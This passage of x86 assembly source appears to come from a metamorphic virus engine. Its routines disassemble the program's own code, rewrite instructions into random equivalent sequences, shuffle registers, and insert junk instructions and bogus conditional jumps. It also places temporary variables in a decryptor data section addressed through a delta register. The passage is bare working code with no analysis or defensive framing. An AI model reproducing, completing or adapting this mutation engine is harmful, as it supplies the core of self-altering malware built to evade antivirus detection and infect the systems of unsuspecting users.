                call    Xp_GenPOPMem       
                call    Xp_GenJMPMem       
                call    Xp_RestoreOperation
                jmp     Xp_EndJmp          

   @@Single:    mov     eax, 0EBh        
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                add     edi, 10h
                jmp     Xp_EndJmp
Xp_GenJMPMem    endp

Xp_GenMOVZX     proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 1
                jz    @@Single          
                call    Random
                and     eax, 1
                jz    @@Double_1        
       @@Double_2:
                xor     eax, eax        
                mov     [ebp+Xp_8Bits], eax
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegMem  
                xor     eax, eax        
                mov     [ebp+Xp_8Bits], eax
                mov     eax, 20h
                mov     [ebp+Xp_Operation], eax
                mov     eax, 0FFh
                mov     [ebp+Xp_Immediate], eax
                call    Xp_GenOPRegImm  
                jmp     Xp_DecreaseRecurseLevel
       @@Double_1:
                mov     eax, [ebp+Register8Bits]
                call    Xpand_TranslateRegister
                mov     ebx, [ebp+Xp_Register]
                cmp     eax, ebx
                jnz   @@Double_2
                mov     eax, 40h         
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_Immediate], eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegImm
                mov     eax, 80h         
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegMem
                jmp     Xp_DecreaseRecurseLevel
       @@Single:
                mov     eax, 0F8h        
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenMOVZX     endp

Xp_GenJcc       proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 2   
                jae   @@Single   
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single
   @@Double:    call    Random
                and     eax, 0Fh
                or      eax, eax      
                jnz   @@Double2       
                                      
                mov     eax, 1        
                mov     [edi+7], eax   
                call  @@InternalSingle2 
                jmp     Xp_DecreaseRecurseLevel

   @@Double2:   mov     eax, [ebp+Xp_Operation]
                cmp     eax, 73h     
                jz    @@Double_JAE
                cmp     eax, 75h     
                jz    @@Double_JNZ
                cmp     eax, 76h     
                jnz   @@Single
   @@Double_JBE:
                mov     ebx, 72h   
                mov     ecx, 74h   
                mov     edx, 76h
                jmp   @@Double_GarbleAndSelect
   @@Double_JNZ:
                mov     ebx, 72h   
                mov     ecx, 75h   
                mov     edx, 77h
                jmp   @@Double_GarbleAndSelect
   @@Double_JAE:
                mov     ebx, 73h   
                mov     ecx, 74h
                mov     edx, 77h
   @@Double_GarbleAndSelect:
                call    Xp_GarbleRegisters 
                call    Xp_SaveOperation
                push    ecx
                mov     [ebp+Xp_Operation], edx  
                call  @@InternalSingle
                pop     ecx
                mov     [ebp+Xp_Operation], ecx  
                call  @@InternalSingle
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    call  @@InternalSingle           
                jmp     Xp_DecreaseRecurseLevel

Xp_GenJcc_SingleJcc:
   @@InternalSingle:
                xor     eax, eax        
                mov     [edi+7], eax    
   @@InternalSingle2:
                mov     eax, [ebp+Xp_Operation]  
                mov     [edi], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+1], eax
                add     edi, 10h
                ret
Xp_GenJcc       endp

Xp_GarbleRegisters proc
                call    Random
                and     eax, 3
                or      eax, eax
                jz      Xp_GarbleRegisters
                cmp     eax, 1
                jz    @@Permutation0
                cmp     eax, 2
                jz    @@Permutation1
    @@Permutation2:
                mov     eax, ebx
                mov     ebx, edx
                mov     edx, eax   
                jmp   @@Permutation0
    @@Permutation1:
                mov     eax, ebx
                mov     ebx, ecx
                mov     ecx, eax   
    @@Permutation0:
                call    Random
                and     eax, 1
                jz    @@Return
    @@Permutation0_0:
                mov     eax, edx
                mov     edx, ecx
                mov     ecx, eax   
    @@Return:   ret
Xp_GarbleRegisters endp

Xp_MakeComposedOPImm proc
                call    Xp_SaveOperation
                call    Random
                mov     ebx, eax                 
                mov     edx, [ebp+Xp_Immediate]  
                mov     eax, [ebp+Xp_Operation]  
                or      eax, eax
                jz    @@Double_OP_ADD       
                cmp     eax, 8
                jz    @@Double_OP_OR        
                cmp     eax, 20h
                jz    @@Double_OP_AND       
                cmp     eax, 30h
                jz    @@Double_OP_XOR       
                cmp     eax, 40h
                jnz   @@Return_Error
   @@Double_OP_MOV:                         
                call    Random
                and     eax, 7
                or      eax, eax
                jz    @@Double_OP_MOV_ADD   
                cmp     eax, 1
                jz    @@Double_OP_MOV_OR    
                cmp     eax, 2
                jz    @@Double_OP_MOV_AND   
                cmp     eax, 3
                jz    @@Double_OP_MOV_XOR   
                cmp     eax, 4
                jnz   @@Double_OP_MOV       
   @@Double_OP_MOV_MOV:
                mov     eax, [ebp+Xp_FlagRegOrMem]
                or      eax, eax
                jz    @@Double_OP_MOV_MOV_MakeReg
                call    Xp_GenOPMemImm
                jmp   @@Return_NoError
   @@Double_OP_MOV_MOV_MakeReg:
                call    Xp_GenOPRegImm
                jmp   @@Return_NoError

   @@Double_OP_MOV_ADD:                     
                sub     edx, ebx            
                xor     ecx, ecx
                jmp   @@Double_OP_MOV_OP
   @@Double_OP_MOV_OR:
                and     ebx, edx            
                call    Random              
                and     eax, edx
                xor     edx, ebx
                or      edx, eax
                mov     ecx, 8
                jmp   @@Double_OP_MOV_OP
   @@Double_OP_MOV_AND:
                call    Random
                and     eax, 1
                jz    @@Double_OP_MOV_AND_2   
                call    Random
                not     ebx
                and     eax, ebx
                not     ebx
                mov     ecx, eax
                or      ecx, edx
                or      edx, ebx
                mov     ebx, ecx
                mov     ecx, 20h
                jmp   @@Double_OP_MOV_OP
   @@Double_OP_MOV_AND_2:
                mov     ecx, ebx
                not     ecx
                or      ecx, edx
                or      edx, ebx
                mov     ebx, ecx
                mov     ecx, 20h
                jmp   @@Double_OP_MOV_OP
   @@Double_OP_MOV_XOR:                     
                xor     edx, ebx
                mov     ecx, 30h
   @@Double_OP_MOV_OP:                      
                push    ecx
                push    edx
                mov     eax, 40h            
                mov     [ebp+Xp_Operation], eax
                mov     [ebp+Xp_Immediate], ebx
                mov     eax, [ebp+Xp_FlagRegOrMem]
                or      eax, eax
                jz    @@Double_OP_MOV_OP_MakeReg
                call    Xp_GenOPMemImm
                pop     edx
                pop     ecx                 
                mov     [ebp+Xp_Operation], ecx
                mov     [ebp+Xp_Immediate], edx
                call    Xp_GenOPMemImm
                jmp   @@Return_NoError
   @@Double_OP_MOV_OP_MakeReg:
                call    Xp_GenOPRegImm
                pop     edx                 
                pop     ecx
                mov     [ebp+Xp_Operation], ecx
                mov     [ebp+Xp_Immediate], edx
                call    Xp_GenOPRegImm
                jmp   @@Return_NoError

   @@Double_OP_ADD:
                sub     edx, ebx       
                jmp   @@Double_OP_OP
   @@Double_OP_OR:
                and     ebx, edx       
                mov     ecx, edx
                xor     edx, ebx
                call    Random
                and     ecx, eax
                or      edx, ecx
                jmp   @@Double_OP_OP
   @@Double_OP_AND:
                mov     ecx, ebx       
                or      ebx, edx
                not     ecx
                or      edx, ecx
                jmp   @@Double_OP_OP
   @@Double_OP_XOR:
                xor     edx, ebx       
   @@Double_OP_OP:
                push    edx          
                mov     [ebp+Xp_Immediate], ebx
                mov     eax, [ebp+Xp_FlagRegOrMem]
                or      eax, eax
                jz    @@Double_OP_OP_MakeReg
                call    Xp_GenOPMemImm    
                pop     edx
                mov     [ebp+Xp_Immediate], edx
                call    Xp_GenOPMemImm    
                jmp   @@Return_NoError
   @@Double_OP_OP_MakeReg:
                call    Xp_GenOPRegImm    
                pop     edx
                mov     [ebp+Xp_Immediate], edx
                call    Xp_GenOPRegImm    
   @@Return_NoError:
                call    Xp_RestoreOperation
                xor     eax, eax
                ret
   @@Return_Error:
                call    Xp_RestoreOperation
                mov     eax, 1
                ret
Xp_MakeComposedOPImm endp


Xp_MakeSET_WEIGHT proc
                call    Xp_SaveOperation
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [ebp+Xp_Register], eax
                call    Xp_GenPUSHReg
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegImm
                call    Xp_RestoreOperation
                mov     eax, [ebp+Xp_Immediate]
                or      eax, eax
       @@SetWeight:
                mov     [ebp+Xp_Immediate], eax
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegImm

                call    Xp_GenOPMemReg

                mov     eax, [ebp+Xp_SrcRegister]
                mov     [ebp+Xp_Register], eax
                call    Xp_GenPOPReg
                ret
Xp_MakeSET_WEIGHT endp

Xp_GetSpecialJcc proc
                push    ebx
                call    Random
                mov     ebx, eax  
                and     eax, 0Eh  
                cmp     eax, 8    
                jae   @@Next      
                shr     ebx, 1
      @@Next:   shr     ebx, 1
                and     ebx, 1    
                add     eax, ebx  
                add     eax, 70h  
                pop     ebx
                ret
Xp_GetSpecialJcc endp


Xp_CopyMemoryReference proc
                mov     eax, [ebp+Xp_Mem_Index1]
                mov     [edi+1], eax
                mov     eax, [ebp+Xp_Mem_Index2]
                mov     [edi+2], eax
                mov     eax, [ebp+Xp_Mem_Addition]
                mov     [edi+3], eax
                ret
Xp_CopyMemoryReference endp


Xp_InsertGarbage proc
                call    Random
                and     eax, 7             
                or      eax, eax
                jz    @@MakeOneByter       
                cmp     eax, 1
                jz    @@MakeMOVRegReg      
                cmp     eax, 2
                jz    @@MakeANDs1          
                cmp     eax, 3
                jz    @@MakeOR0            
                cmp     eax, 4
                jz    @@MakeXOR0           
                cmp     eax, 5
                jz    @@MakeADD0           
                cmp     eax, 6
                jz    @@MakeCMPJcc         
                                           
                jmp     Xp_InsertGarbage   

        @@MakeADD0:
                xor     eax, eax           
                mov     [ebp+Xp_Operation], eax
        @@MakeOP0:
                xor     eax, eax           
                mov     [ebp+Xp_Immediate], eax
        @@MakeOPx:
                xor     eax, eax           
                mov     [edi+0Bh], eax
                mov     [edi+0Ch], esi     
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax  
        @@MakeOPReg0:
                call    Random          
                and     eax, 7          
                cmp     eax, 4
                jz    @@MakeOPReg0
                cmp     eax, [ebp+TranslatedDeltaRegister]
                jz    @@MakeOPReg0
                mov     [ebp+Xp_Register], eax 
                call    Xp_GenOPRegImm         
                ret

        @@MakeOR0:
                mov     eax, 8            
                mov     [ebp+Xp_Operation], eax
                jmp   @@MakeOP0

        @@MakeXOR0:
                mov     eax, 30h          
                mov     [ebp+Xp_Operation], eax
                jmp   @@MakeOP0

        @@MakeANDs1:
                mov     eax, 20h          
                mov     [ebp+Xp_Operation], eax
                mov     eax, -1           
                mov     [ebp+Xp_Immediate], eax
                jmp   @@MakeOPx


        @@MakeCMPJcc:
                call    Random         
                and     eax, 7         
                cmp     eax, 4         
                jz    @@MakeADD0       
                cmp     eax, [ebp+TranslatedDeltaRegister] 
                jz    @@MakeADD0       
                                       
                mov     [ebp+Xp_Register], eax    
                mov     [ebp+Xp_SrcRegister], eax 
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax   
                mov     [edi+0Bh], eax        
                mov     [edi+0Ch], esi        
                mov     eax, 38h              
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegReg        
                call    Xp_GetSpecialJcc      
                mov     [ebp+Xp_Operation], eax 
        @@OtherLabel:
                call    Random                
                and     eax, 01F8h            
                cmp     eax, [ebp+NumberOfLabels]
                jae   @@OtherLabel
                add     eax, [ebp+LabelTable] 
                mov     [ebp+Xp_Immediate], eax
                call    Xp_GenJcc_SingleJcc   
                ret

        @@MakeMOVRegReg:
                call    Random          
                and     eax, 7
                cmp     eax, 4
                jz    @@MakeMOVRegReg
                cmp     eax, [ebp+TranslatedDeltaRegister]
                jz    @@MakeMOVRegReg
                mov     [ebp+Xp_Register], eax   
                mov     [ebp+Xp_SrcRegister], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax      
                mov     [edi+0Bh], eax
                mov     [edi+0Ch], esi    
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax 
                call    Xp_GenOPRegReg
                ret

        @@MakeOneByter:
                call    Random
                and     eax, 1
                jz    @@OnlyNOP          
                call    Random
                and     eax, 0100h       
                add     eax, 0F8FDh      
                jmp   @@OtherOneByter    
   @@OnlyNOP:   mov     eax, 90FDh       
   @@OtherOneByter:
                mov     [edi], eax       
                xor     eax, eax
                mov     [edi+0Bh], eax   
                mov     [edi+0Ch], esi   
                add     edi, 10h
                call    Random           
                and     eax, 0Fh         
                or      eax, eax
                jz    @@MakeOneByter
                ret
Xp_InsertGarbage endp


Xp_IncreaseRecurseLevel proc
                call    Random
                and     eax, 1
                jnz   @@Close      

                mov     eax, [ebp+Xp_RecurseLevel]
                add     eax, 1
                mov     [ebp+Xp_RecurseLevel], eax
   @@Close:
                ret
Xp_IncreaseRecurseLevel endp


Xp_RestoreOpAndDecreaseRecurseLevel proc
                call    Xp_RestoreOperation
Xp_RestoreOpAndDecreaseRecurseLevel endp    
                                            
Xp_DecreaseRecurseLevel proc
                call    Random
                and     eax, 1
                jnz   @@Close      
                mov     eax, [ebp+Xp_RecurseLevel]
                sub     eax, 1
                mov     [ebp+Xp_RecurseLevel], eax
   @@Close:
                ret
Xp_DecreaseRecurseLevel endp

Xp_GetTempVar   proc
                push    edx
                call    Random
                mov     edx, eax          
    @@VariableCheck:
                and     edx, 1FFF8h       
                mov     eax, [ebp+CreatingADecryptor]
                or      eax, eax          
                jz    @@Normal1           
                and     edx, 00FF8h       
                cmp     edx, 20h          
                jb    @@Add20             
                cmp     edx, 0F00h        
                jb    @@Normal1           
                xor     edx, edx
    @@Add20:    add     edx, 20h
    @@Normal1:  add     edx, [ebp+VarMarksTable]
                mov     eax, [edx]        
                or      eax, eax          
                jz    @@VariableFound     
                sub     edx, [ebp+VarMarksTable]
                add     edx, 8
                jmp   @@VariableCheck
    @@VariableFound:                      
                mov     eax, 1            
                mov     [edx], eax
                sub     edx, [ebp+VarMarksTable]
                call    Random            
                and     eax, 3            
                add     edx, eax          
                mov     eax, [ebp+CreatingADecryptor]
                or      eax, eax
                jz    @@Normal2           
                add     edx, [ebp+Decryptor_DATA_SECTION] 
                mov     [ebp+Xp_Mem_Addition], edx        
                mov     eax, 8                       
                jmp   @@Continue                     
    @@Normal2:  add     edx, [ebp+New_DATA_SECTION]  
                mov     [ebp+Xp_Mem_Addition], edx   
                mov     eax, [ebp+DeltaRegister]
                call    Xpand_TranslateRegister
    @@Continue: mov     [ebp+Xp_Mem_Index1], eax  
                mov     eax, 8
                mov     [ebp+Xp_Mem_Index2], eax  
                pop     edx
                ret
Xp_GetTempVar   endp


Xp_SaveOperation proc
                pop     ebx           
                mov     eax, [ebp+Xp_Operation]
                push    eax                       
                mov     eax, [ebp+Xp_Mem_Index1]  
                push    eax
                mov     eax, [ebp+Xp_Mem_Index2]
                push    eax
                mov     eax, [ebp+Xp_Mem_Addition]
                push    eax
                mov     eax, [ebp+Xp_Register]
                push    eax
                mov     eax, [ebp+Xp_SrcRegister]
                push    eax
                mov     eax, [ebp+Xp_Immediate]
                push    eax
                mov     eax, [ebp+Xp_8Bits]
                push    eax
                push    ebx                 
                ret
Xp_SaveOperation endp


Xp_RestoreOperation proc
                pop     ebx           
                pop     eax
                mov     [ebp+Xp_8Bits], eax
                pop     eax                        
                mov     [ebp+Xp_Immediate], eax    
                pop     eax                        
                mov     [ebp+Xp_SrcRegister], eax
                pop     eax
                mov     [ebp+Xp_Register], eax
                pop     eax
                mov     [ebp+Xp_Mem_Addition], eax
                pop     eax
                mov     [ebp+Xp_Mem_Index2], eax
                pop     eax
                mov     [ebp+Xp_Mem_Index1], eax
                pop     eax
                mov     [ebp+Xp_Operation], eax
                push    ebx
                ret
Xp_RestoreOperation endp

;--------------------------------------------------------------------------------------

DecodeMemoryConstruction proc
                mov     eax, 00000808h 
                mov     [edi+1], eax
                xor     eax, eax
                mov     [edi+3], eax
                mov     ebx, 1         
                                       

                mov     eax, [edx]     
                and     eax, 7         
                cmp     eax, 4
                jz    @@ThirdOpcodeUsed 
                cmp     eax, 5         
                jz    @@DirectMemory   

      @@SetBaseRegister:
                mov     eax, [edx]     
                and     eax, 7
                push    edx
                mov     edx, [edi+1]   
                and     edx, 0FFFFFF00h
                add     eax, edx
                pop     edx
                mov     [edi+1], eax
                mov     eax, [edx]     
                and     eax, 0C0h
                or      eax, eax       
                jz    @@NoAddition
                cmp     eax, 40h       
                jz    @@ByteAddition
      @@DwordAddition:
                add     ebx, 4         
                mov     eax, [edx+1]   
                jmp   @@SetAddition    
      @@ByteAddition:
                add     ebx, 1         
                mov     eax, [edx+1]   
                and     eax, 0FFh      
                cmp     eax, 7Fh
                jbe   @@SetAddition
                add     eax, 0FFFFFF00h
      @@SetAddition:
                mov     [edi+3], eax   
      @@NoAddition:
                ret                    

      @@DirectMemory:
                mov     eax, [edx]     
                and     eax, 0C0h
                or      eax, eax        
                jnz   @@SetBaseRegister 
                jmp   @@DwordAddition   
                                        
      
      @@ThirdOpcodeUsed:
                add     ebx, 1          
                mov     eax, [edx+1]    
                and     eax, 38h        
                shr     eax, 3
                cmp     eax, 4          
                jz    @@IgnoreScalarRegister
                mov     ecx, eax        
                mov     eax, [edx+1]    
                and     eax, 0C0h       
                or      eax, ecx        
                push    edx             
                mov     edx, [edi+2]
                and     edx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, edx
                pop     edx
                mov     [edi+2], eax
      @@IgnoreScalarRegister:
                mov     eax, [edx]      
                and     eax, 0C0h       
                or      eax, eax        
                jz    @@EBPMeansDwordAddition 
                mov     eax, [edx+1]                              
                and     eax, 7          
                push    edx
                mov     edx, [edi+1]    
                and     edx, 0FFFFFF00h 
                add     eax, edx
                pop     edx
                mov     [edi+1], eax
                mov     eax, [edx]      
                and     eax, 0C0h
                cmp     eax, 40h
                jz    @@ByteAddition2   
      @@DwordAddition2:
                add     ebx, 4          
                mov     eax, [edx+2]    
                jmp   @@SetAddition2
      @@ByteAddition2:
                add     ebx, 1          
                mov     eax, [edx+2]    
                and     eax, 0FFh       
                cmp     eax, 7Fh
                jbe   @@SetAddition2
                add     eax, 0FFFFFF00h
      @@SetAddition2:
                mov     [edi+3], eax    
                ret

      @@EBPMeansDwordAddition:
                mov     eax, [edx+1]    
                and     eax, 7
                cmp     eax, 5          
                jz    @@DwordAddition2  
                push    edx             
                mov     edx, [edi+1]    
                and     edx, 0FFFFFF00h
                add     eax, edx        
                pop     edx             
                mov     [edi+1], eax    
                ret                     
DecodeMemoryConstruction endp


DisasmCode      proc
                xor     eax, eax
                mov     [ebp+NumberOfLabels], eax  
                mov     [ebp+NumberOfLabelsPost], eax 
                                                      
                mov     ecx, 80000h/4       
                mov     edi, [ebp+PathMarksTable]
                xor     eax, eax
      @@LoopInitializePathTable:
                call    Random
                and     eax, 0FCh
                mov     [edi], eax       
                add     edi, 4           
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopInitializePathTable

                mov     edi, [ebp+InstructionTable]

    
      @@LoopTrace:
      @@CheckCurrentLabel:
                mov     eax, esi        
                sub     eax, [ebp+_CODE_SECTION]   
                sub     eax, ebp
                add     eax, [ebp+PathMarksTable]
                mov     eax, [eax]      
                and     eax, 0FFh       
                cmp     eax, 1
                jnz   @@CheckIfFutureLabelArrived

                mov     edx, [ebp+InstructionTable] 
        @@CheckCurrEIP_001:
                mov     eax, [edx+0Ch]   
                cmp     eax, esi         
                jz    @@ItsTheCurrentEIP 
                add     edx, 10h         
                jmp   @@CheckCurrEIP_001
        @@ItsTheCurrentEIP:
                mov     [edi+0Ch], esi  
                mov     eax, [edi+0Bh]  
                and     eax, 0FFFFFF00h 
                mov     [edi+0Bh], eax
                mov     eax, 0E9h       
                mov     [edi], eax      
                mov     eax, esi
                mov     ebx, edx        
                call    InsertLabel
                mov     [edi+1], edx
                add     edi, 10h        

     
                mov     ecx, [ebp+NumberOfLabelsPost] 
                or      ecx, ecx  
                jz    @@FinDeTraduccion 
                                        
                mov     ebx, [ebp+FutureLabelTable] 
      @@LoopCheckOtherFutureLabel:      
                mov     eax, [ebx]
                cmp     eax, esi
                jz    @@OtherFutureLabelFound
      @@LoopSearchOtherFutureLabel:
                add     ebx, 8
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopCheckOtherFutureLabel
                                       
                mov     ecx, [ebp+NumberOfLabelsPost]
                mov     ebx, [ebp+FutureLabelTable]
      @@LoopCheckOtherFutureLabel2:
                mov     eax, [ebx]     
                or      eax, eax       
                jz    @@LoopSearchOtherFutureLabel2 
                sub     eax, ebp       
                sub     eax, [ebp+_CODE_SECTION]   
                add     eax, [ebp+PathMarksTable]  
                mov     eax, [eax]
                and     eax, 0FFh
                cmp     eax, 1
                jz    @@ReleaseLabelsInThatAddress
      @@LoopSearchOtherFutureLabel2:
                add     ebx, 8
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopCheckOtherFutureLabel2
                jmp   @@GetEIPFromFutureLabelList

       @@ReleaseLabelsInThatAddress:
                push    ebx            
                push    ecx            
                mov     esi, [ebx]     
                call    ReleaseFutureLabels 
                pop     ecx
                pop     ebx
                jmp   @@LoopSearchOtherFutureLabel2

        @@OtherFutureLabelFound:
                mov     eax, [ebx+4]    
                mov     [eax+1], edx    
                xor     eax, eax
                mov     [ebx], eax      
                jmp   @@LoopSearchOtherFutureLabel 

     @@CheckIfFutureLabelArrived:
                mov     eax, [edi+0Bh]  
                and     eax, 0FFFFFF00h
                mov     [edi+0Bh], eax
                call    ReleaseFutureLabels 
                                            
      @@DefineInstr:
                mov     [edi+0Ch], esi  
                mov     ebx, esi        
                sub     ebx, [ebp+_CODE_SECTION]
                sub     ebx, ebp
                add     ebx, [ebp+PathMarksTable]
                mov     eax, [ebx]
                or      eax, 1
                mov     [ebx], eax      

                mov     eax, [esi]      
                and     eax, 0FFh
                cmp     eax, 3Fh       
                jbe   @@GenericOpcode
                cmp     eax, 47h       
                jbe   @@Op_INC
                cmp     eax, 4Fh       
                jbe   @@Op_DEC
                cmp     eax, 5Fh       
                jbe   @@Op_PUSHPOP
                cmp     eax, 68h       
                jz    @@Op_PUSHValue
                cmp     eax, 6Ah       
                jz    @@Op_PUSHSignedValue
                cmp     eax, 70h       
                jb    @@DefineInstr_00
                cmp     eax, 7Fh
                jbe   @@Jcc
       @@DefineInstr_00:
                cmp     eax, 80h       
                jb    @@DefineInstr_01
                cmp     eax, 83h
                jbe   @@GenericOpcode2
       @@DefineInstr_01:
                cmp     eax, 84h        
                jz    @@Gen_8b_MemReg
                cmp     eax, 85h        
                jz    @@Gen_32b_MemReg
                cmp     eax, 8Bh        
                jbe   @@GenericOpcode
                cmp     eax, 8Dh        
                jz    @@LEA
                cmp     eax, 8Fh        
                jz    @@POPMem
                cmp     eax, 90h        
                jz    @@NOP
                cmp     eax, 0A8h       
                jz    @@TESTALValue
                cmp     eax, 0A9h       
                jz    @@TESTEAXValue
                cmp     eax, 0B0h       
                jb    @@DefineInstr_02
                cmp     eax, 0B7h
                jbe   @@MOVReg8Value
                cmp     eax, 0BFh       
                jbe   @@MOVRegValue
       @@DefineInstr_02:
                cmp     eax, 0C0h       
                jz    @@BitShifting8
                cmp     eax, 0C1h       
                jz    @@BitShifting32
                cmp     eax, 0C3h       
                jz    @@RET
                cmp     eax, 0C6h       
                jz    @@MOVMem8Value
                cmp     eax, 0C7h       
                jz    @@MOVMem32Value
                cmp     eax, 0D0h       
                jz    @@BitShifting8
                cmp     eax, 0D1h       
                jz    @@BitShifting32

                cmp     eax, 0E8h       
                jz    @@CALL
                cmp     eax, 0E9h       
                jz    @@JMP
                cmp     eax, 0EBh       
                jz    @@JMP8
                cmp     eax, 0F5h       
                jz    @@NOP
                cmp     eax, 0F6h       
                jz    @@SomeNotVeryCommon8
                cmp     eax, 0F7h
                jz    @@SomeNotVeryCommon32
                cmp     eax, 0FDh   
                jbe   @@NOP         
                cmp     eax, 0FEh       
                jz    @@INCDECMem8
                cmp     eax, 0FFh       
                jz    @@INCDECPUSHMem32
                mov     eax, 0FFh       
     @@SetOneByteInstruction:           
                mov     [edi], eax

                add     edi, 10h        
                inc     esi             
     @@ContinueDissasembly:
                jmp   @@LoopTrace       


     @@GenericOpcode:
                and     eax, 7     
                cmp     eax, 3     
                jbe   @@Gen_NormalOpcode  
                cmp     eax, 4     
                jz    @@Gen_UsingAL
                cmp     eax, 5     
                jz    @@Gen_UsingEAX
                mov     eax, [esi] 
                and     eax, 0FFh  
                cmp     eax, 0Fh
                jz    @@Opcode0F
                jmp   @@SetOneByteInstruction 

        @@Gen_NormalOpcode:
                or      eax, eax   
                jz    @@Gen_8b_MemReg
                cmp     eax, 1     
                jz    @@Gen_32b_MemReg
                cmp     eax, 2     
                jz    @@Gen_8b_RegMem

        @@Gen_32b_RegMem:
                mov     eax, [esi+1]
                and     eax, 0C0h
                cmp     eax, 0C0h  
                jz    @@Gen_32b_ReglReg
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 8Bh         
                jnz   @@Gen_32b_RegMem_0 
                mov     eax, 40h+2       
                jmp   @@Gen_GenMem       
        @@Gen_32b_RegMem_0:
                and     eax, 38h         
                add     eax, 2           
        @@Gen_GenMem:
                mov     edx, [edi]       
                and     edx, 0FFFFFF00h  
                and     eax, 0FFh
                add     eax, edx
                mov     [edi], eax
                mov     eax, [esi+1]     
                and     eax, 38h         
                shr     eax, 3
                mov     [edi+7], eax     
                mov     edx, esi         
                add     edx, 1           
                call    DecodeMemoryConstruction 
                add     esi, ebx         
                add     esi, 1           
                jmp   @@NextInstruction

        @@Gen_32b_MemReg:
                mov     eax, [esi+1]   
                and     eax, 0C0h      
                cmp     eax, 0C0h
                jz    @@Gen_32b_lRegReg 
                mov     eax, [esi]
                and     eax, 0FFh      
                cmp     eax, 85h       
                jnz   @@Gen_32b_MemReg_0
                mov     eax, 48h+3     
                jmp   @@Gen_GenMem
        @@Gen_32b_MemReg_0:
        @@Gen_32b_MemReg_1:
                cmp     eax, 89h       
                jnz   @@Gen_32b_MemReg_2
                mov     eax, 40h+3     
                jmp   @@Gen_GenMem
        @@Gen_32b_MemReg_2:
                and     eax, 38h       
                add     eax, 3
                jmp   @@Gen_GenMem     

        @@Gen_32b_ReglReg:
                call    GenOp_SetRegReg 
        @@Gen_GenReglReg:
                mov     eax, [esi+1]  
                and     eax, 7
                mov     [edi+1], eax  
                mov     eax, [esi+1]  
                and     eax, 38h
                shr     eax, 3
                mov     [edi+7], eax
                add     esi, 2
                jmp   @@NextInstruction

        @@Gen_32b_lRegReg:
                call    GenOp_SetRegReg 
        @@Gen_GenlRegReg:
                mov     eax, [esi+1]  
                and     eax, 7        
                mov     [edi+7], eax
                mov     eax, [esi+1]
                and     eax, 38h
                shr     eax, 3
                mov     [edi+1], eax
                add     esi, 2
                jmp   @@NextInstruction

        @@Gen_8b_RegMem:
                mov     eax, [esi+1]   
                and     eax, 0C0h
                cmp     eax, 0C0h      
                jz    @@Gen_8b_ReglReg 
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 8Ah       
                jnz   @@Gen_8b_RegMem_0
                mov     eax, 40h+82h   
                jmp   @@Gen_GenMem     
        @@Gen_8b_RegMem_0:
                and     eax, 38h
                add     eax, 82h       
                jmp   @@Gen_GenMem

        @@Gen_8b_MemReg:
                mov     eax, [esi+1]   
                and     eax, 0C0h      
                cmp     eax, 0C0h
                jz    @@Gen_8b_lRegReg 
                mov     eax, [esi]
                and     eax, 0FFh      
                cmp     eax, 84h       
                jnz   @@Gen_8b_MemReg_0
                mov     eax, 48h+83h   
                jmp   @@Gen_GenMem
        @@Gen_8b_MemReg_0:
        @@Gen_8b_MemReg_1:
                cmp     eax, 88h       
                jnz   @@Gen_8b_MemReg_2
                mov     eax, 40h+83h   
                jmp   @@Gen_GenMem
        @@Gen_8b_MemReg_2:
                and     eax, 38h       
                add     eax, 83h
                jmp   @@Gen_GenMem     
                                       

        @@Gen_8b_lRegReg:
                call    GenOp_SetRegReg 
                mov     eax, [edi]      
                add     eax, 80h
                mov     [edi], eax
                jmp   @@Gen_GenlRegReg  

        @@Gen_8b_ReglReg:
                call    GenOp_SetRegReg 
                mov     eax, [edi]      
                add     eax, 80h
                mov     [edi], eax
                jmp   @@Gen_GenReglReg  

        @@Gen_UsingAL:
                mov     eax, [esi]    
                and     eax, 38h
                add     eax, 80h
                mov     edx, [edi]    
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
                xor     eax, eax
                mov     eax, [esi+1]  
                and     eax, 0FFh     
                cmp     eax, 7Fh
                jbe   @@Gen_UsingAL_01
                add     eax, 0FFFFFF00h
          @@Gen_UsingAL_01:
                add     esi, 2        
                jmp   @@Gen_SetValue

        @@Gen_UsingEAX:
                mov     eax, [esi]    
                and     eax, 38h
                mov     edx, [edi]    
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
                mov     eax, [esi+1]  
                add     esi, 5

        @@Gen_SetValue:
                mov     [edi+7], eax
                xor     eax, eax      
                mov     [edi+1], eax
                jmp   @@NextInstruction


    @@Op_INC:   and     eax, 7        
                mov     [edi+1], eax  
                xor     eax, eax      
                jmp   @@Op_GenINCDEC


    @@Op_DEC:   and     eax, 7        
                mov     [edi+1], eax  
                mov     eax, 28h      
         @@Op_GenINCDEC:
                mov     edx, [edi]    
                and     edx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, edx
                mov     [edi], eax
                mov     eax, 1        
                mov     [edi+7], eax
                add     esi, 1        
                jmp   @@NextInstruction


  @@Op_PUSHPOP: and     eax, 7        
